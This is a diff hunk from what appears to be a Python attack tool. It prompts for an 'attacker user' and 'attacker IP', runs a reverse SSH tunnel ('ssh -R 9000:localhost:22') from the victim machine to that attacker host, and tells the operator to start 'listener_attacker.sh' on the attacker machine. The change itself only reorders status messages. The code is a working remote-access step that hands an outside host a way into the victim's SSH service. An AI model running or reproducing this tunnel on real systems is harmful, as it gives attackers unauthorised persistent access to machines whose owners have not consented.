@@ -193,12 +193,14 @@ while True:
                 correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
                 sleep(0.1)
                 if correctsshinput == "y":
+                    print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
+                    sleep(1)
+                    print(Fore.YELLOW + "In the meanwhile run listener_attacker.sh on your attacker machine!")
+                    sleep(2)
                     ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
                     run_ps(ssh_tunnel)
                     sleep(10)
                     cls()
-                    print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
-                    sleep(1)
                     break
                 else:
                     print(" ")
